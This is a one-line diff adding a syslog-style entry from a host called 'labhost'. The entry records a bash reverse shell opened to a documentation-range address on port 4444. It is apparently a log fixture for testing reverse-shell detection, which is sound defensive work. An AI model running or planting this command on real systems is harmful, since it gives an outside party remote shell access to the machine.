@@ -1,0 +1,1 @@
+Mar  3 09:48:12 labhost bash[4321]: bash -i >& /dev/tcp/198.51.100.42/4444 0>&1
